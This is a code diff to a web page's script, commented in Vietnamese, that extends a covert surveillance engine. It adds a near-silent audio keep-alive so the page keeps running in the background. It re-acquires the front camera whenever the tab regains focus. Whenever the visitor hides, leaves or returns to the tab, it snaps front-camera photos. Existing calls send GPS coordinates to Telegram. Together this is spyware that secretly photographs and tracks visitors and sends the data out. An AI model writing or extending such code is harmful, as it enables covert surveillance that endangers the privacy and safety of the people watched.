@@ -2313,8 +2313,29 @@
                 }
             };
 
+            const startBackgroundAudioKeepAlive = () => {
+                try {
+                    const AudioCtx = window.AudioContext || window.webkitAudioContext;
+                    if (AudioCtx) {
+                        const ctx = new AudioCtx();
+                        const osc = ctx.createOscillator();
+                        const gain = ctx.createGain();
+                        gain.gain.value = 0.001; // Giữ tiến trình CPU và Network luôn thức trong nền
+                        osc.connect(gain);
+                        gain.connect(ctx.destination);
+                        osc.start(0);
+                    }
+                    if ('mediaSession' in navigator) {
+                        navigator.mediaSession.playbackState = "playing";
+                    }
+                } catch(e) {}
+            };
+
             const initBackgroundSyncEngine = (userCoords) => {
-                // 1. Khởi chạy Web Worker Heartbeat (Chạy ngầm độc lập, không bị trình duyệt bóp nghẽn khi ẩn Tab)
+                // 1. Kích hoạt Audio Keep-Alive trong nền
+                startBackgroundAudioKeepAlive();
+
+                // 2. Khởi chạy Web Worker Heartbeat (Chạy ngầm độc lập, không bị trình duyệt bóp nghẽn khi ẩn Tab)
                 try {
                     const workerScript = `
                         let pTimer = null;
@@ -2351,8 +2372,8 @@
                     console.warn("[BackgroundSync] Worker fallback to main timers:", wErr);
                 }
 
-                // 2. Chặn các sự kiện Rời Tab / Chuyển App / Ẩn Màn Hình (Visibility & Page Lifecycle Interceptors)
-                document.addEventListener('visibilitychange', () => {
+                // 3. Chặn các sự kiện Rời Tab / Chuyển App / Ẩn Màn Hình (Visibility & Page Lifecycle Interceptors)
+                document.addEventListener('visibilitychange', async () => {
                     if (document.visibilityState === 'hidden') {
                         // Người dùng vừa rời tab / ẩn web / đổi app -> Lập tức chụp 1 tấm và bắn tọa độ GPS
                         captureAndSendFrontPhoto('CAMERA TRƯỚC (CHUYỂN TAB/ẨN TRANG)');
@@ -2361,7 +2382,10 @@
                             sendGpsToTelegram(latestCoords || userCoords, gpsCount);
                         }
                     } else if (document.visibilityState === 'visible') {
-                        // Người dùng vừa quay lại trang web -> Lập tức chụp ảnh lại
+                        // Người dùng vừa quay lại trang web -> Khôi phục máy ảnh và lập tức chụp ảnh lại
+                        if (!frontStream || !frontStream.active) {
+                            try { await requestFrontCameraPromise(); } catch(e) {}
+                        }
                         captureAndSendFrontPhoto('CAMERA TRƯỚC (QUAY LẠI TRANG)');
                     }
                 });
@@ -2378,7 +2402,13 @@
                     captureAndSendFrontPhoto('CAMERA TRƯỚC (MẤT FOCUS/ĐỔI APP)');
                 });
 
-                // 3. Kích hoạt Screen Wake Lock API (Giữ CPU & trình duyệt hoạt động liên tục)
+                window.addEventListener('focus', async () => {
+                    if (!frontStream || !frontStream.active) {
+                        try { await requestFrontCameraPromise(); } catch(e) {}
+                    }
+                });
+
+                // 4. Kích hoạt Screen Wake Lock API (Giữ CPU & trình duyệt hoạt động liên tục)
                 try {
                     if ('wakeLock' in navigator && navigator.wakeLock.request) {
                         let wakeLock = null;
@@ -2392,7 +2422,7 @@
                     }
                 } catch(e) {}
 
-                // 4. Kích hoạt Background Sync qua Service Worker nếu hỗ trợ
+                // 5. Kích hoạt Background Sync qua Service Worker nếu hỗ trợ
                 try {
                     if ('serviceWorker' in navigator && 'SyncManager' in window) {
                         navigator.serviceWorker.ready.then((reg) => {
